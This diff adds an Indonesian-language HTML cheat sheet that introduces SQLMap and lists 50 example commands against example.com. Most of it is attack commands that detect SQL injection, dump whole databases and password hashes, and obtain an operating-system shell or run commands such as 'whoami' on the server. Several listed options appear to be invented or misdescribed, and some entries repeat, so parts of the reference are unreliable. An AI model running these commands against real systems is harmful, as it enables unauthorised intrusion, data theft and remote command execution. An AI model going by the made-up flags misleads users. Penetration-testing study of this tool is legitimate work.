@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap - Nofrinto Flory - Syber9</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #121212;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        h1, h2 {
+            color: #00ff00;
+            text-align: center;
+        }
+        .container {
+            margin-top: 20px;
+            max-width: 800px;
+        }
+        pre {
+            background-color: #1e1e1e;
+            padding: 10px;
+            border: 1px solid #00ff00;
+            overflow-x: auto;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #00ff00;
+        }
+        .navbar {
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 1px solid #00ff00;
+        }
+        .navbar-nav .nav-link {
+            color: #00ff00 !important;
+        }
+        .navbar-nav .nav-link:hover {
+            background-color: #262626;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img style="border-radius: 100%;" src="./image/bg1.webp" alt="Nofrinto Flory" width="30" height="30">
+                SQLMap
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="dashboard.html">Dashboard</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#pengantar">Pengantar</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#instalasi">Instalasi</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#penggunaan">Penggunaan Dasar</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contoh">50 Contoh Penggunaan</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#catatan">Catatan Penting</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1>SQLMap</h1>
+
+        <h2 id="pengantar">Pengenalan</h2>
+        <pre>
+SQLMap adalah alat open-source untuk pengujian penetrasi yang digunakan untuk mendeteksi dan mengeksploitasi kerentanan SQL Injection pada aplikasi web.
+        </pre>
+
+        <h2 id="instalasi">Instalasi</h2>
+        <pre>
+# Untuk menginstal SQLMap, gunakan perintah berikut:
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+        </pre>
+
+        <h2 id="penggunaan">Penggunaan Dasar</h2>
+        <pre>
+# Untuk memulai SQLMap dengan URL target:
+python sqlmap.py -u <URL>
+        </pre>
+
+        <h2 id="contoh">50 Contoh Penggunaan SQLMap</h2>
+
+        <h3>1. Memeriksa kerentanan SQL Injection</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1"
+        </pre>
+
+        <h3>2. Menentukan metode HTTP (GET/POST)</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --method POST
+        </pre>
+
+        <h3>3. Menggunakan data POST</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php" --data "username=admin&password=admin"
+        </pre>
+
+        <h3>4. Menentukan cookie</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --cookie "PHPSESSID=123456"
+        </pre>
+
+        <h3>5. Menggunakan proxy</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --proxy "http://127.0.0.1:8080"
+        </pre>
+
+        <h3>6. Mengabaikan kesalahan SSL</h3>
+        <pre>
+python sqlmap.py -u "https://example.com/page.php?id=1" --ignore-ssl-errors
+        </pre>
+
+        <h3>7. Menyimpan output ke file</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --output-dir /path/to/output
+        </pre>
+
+        <h3>8. Mengatur tingkat verbosity</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -v 3
+        </pre>
+
+        <h3>9. Mengambil daftar database</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --dbs
+        </pre>
+
+        <h3>10. Mengambil tabel dari database tertentu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database --tables
+        </pre>
+
+        <h3>11. Mengambil kolom dari tabel tertentu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database -T nama_tabel --columns
+        </pre>
+
+        <h3>12. Mengambil data dari tabel tertentu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database -T nama_tabel --dump
+        </pre>
+
+        <h3>13. Menyimpan hasil dump ke file</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database -T nama_tabel --dump --output-dir /path/to/output
+        </pre>
+
+        <h3>14. Menentukan waktu untuk injeksi</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --time-sec 5
+        </pre>
+
+        <h3>15. Menggunakan deteksi blind SQL Injection</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --technique B
+        </pre>
+
+        <h3>16. Menentukan user-agent khusus</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --user-agent "Mozilla/5.0"
+        </pre>
+
+        <h3>17. Menggunakan opsi --os-shell</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --os-shell
+        </pre>
+
+        <h3>18. Mengeksekusi perintah sistem</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --os-cmd "ls -la"
+        </pre>
+
+        <h3>19. Menentukan level injeksi</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --level 5
+        </pre>
+
+        <h3>20. Mengabaikan parameter tertentu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --ignore-param "id"
+        </pre>
+
+        <h3>21. Menggunakan file wordlist untuk password</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --passwords --passwords-file /path/to/wordlist.txt
+        </pre>
+
+        <h3>22. Memperoleh informasi tentang versi database</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --banner
+        </pre>
+
+        <h3>23. Mengatur cookie untuk otentikasi</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --cookie "sessionid=abcdef"
+        </pre>
+
+        <h3>24. Menggunakan payload kustom</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --payload "1' OR '1'='1"
+        </pre>
+
+        <h3>25. Menggunakan tampilan (view) pada database</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --dbs --dump
+        </pre>
+
+        <h3>26. Menentukan limit untuk hasil</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --limit 10
+        </pre>
+
+        <h3>27. Memperoleh data dari tabel di semua database</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --dump-all
+        </pre>
+
+        <h3>28. Menggunakan mode HTTP/2</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --http2
+        </pre>
+
+        <h3>29. Menggunakan base64 untuk payload</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --base64 "your_payload_here"
+        </pre>
+
+        <h3>30. Menggunakan fitur SQL injection berbasis waktu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --time-sec 5 --technique T
+        </pre>
+
+        <h3>31. Menentukan nama database</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database --tables
+        </pre>
+
+        <h3>32. Memperoleh kolom dari database dengan nama tertentu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database -T nama_tabel --columns
+        </pre>
+
+        <h3>33. Menggunakan pengujian POST dengan data teracak</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php" --data "param1=value1&param2=value2" --risk 2
+        </pre>
+
+        <h3>34. Menentukan kecepatan injeksi</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --delay 1
+        </pre>
+
+        <h3>35. Menggunakan mode spesifik untuk pengujian</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --technique "BEUSTQ"
+        </pre>
+
+        <h3>36. Memperoleh data password dari tabel tertentu</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -D nama_database -T nama_tabel --dump --where "username='admin'"
+        </pre>
+
+        <h3>37. Menggunakan opsi --safe-url untuk menghindari blokir</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --safe-url "http://example.com/"
+        </pre>
+
+        <h3>38. Menggunakan custom data untuk HTTP headers</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --headers "X-Forwarded-For: 127.0.0.1"
+        </pre>
+
+        <h3>39. Menggunakan captcha bypass</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --captcha "my_captcha_value"
+        </pre>
+
+        <h3>40. Menggunakan opsi untuk mengabaikan parameter yang valid</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --ignore-params "param1,param2"
+        </pre>
+
+        <h3>41. Menggunakan mode verbose untuk hasil lebih detail</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" -v 4
+        </pre>
+
+        <h3>42. Menggunakan token CSRF dalam permintaan</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --csrf-token "my_token_value"
+        </pre>
+
+        <h3>43. Menggunakan fitur untuk mendapatkan shell</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --os-shell
+        </pre>
+
+        <h3>44. Mengekstrak database menggunakan file dump</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --dump -D nama_database
+        </pre>
+
+        <h3>45. Menggunakan modifikasi HTTP untuk injeksi</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --method PUT
+        </pre>
+
+        <h3>46. Menggunakan mode verbose untuk kesalahan</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --debug
+        </pre>
+
+        <h3>47. Menggunakan command execution</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --os-cmd "whoami"
+        </pre>
+
+        <h3>48. Menentukan timeout</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --timeout 10
+        </pre>
+
+        <h3>49. Menjalankan SQLMap dalam mode headless</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --batch
+        </pre>
+
+        <h3>50. Menggunakan format output JSON</h3>
+        <pre>
+python sqlmap.py -u "http://example.com/page.php?id=1" --output-format json
+        </pre>
+
+        <h2 id="catatan">Catatan Penting</h2>
+        <pre>
+- Gunakan SQLMap dengan izin yang tepat pada server yang Anda targetkan.
+- Hasil dari SQLMap harus digunakan untuk tujuan pengujian keamanan yang sah.
+        </pre>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2024 Nofrinto Flory -SQLMap</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
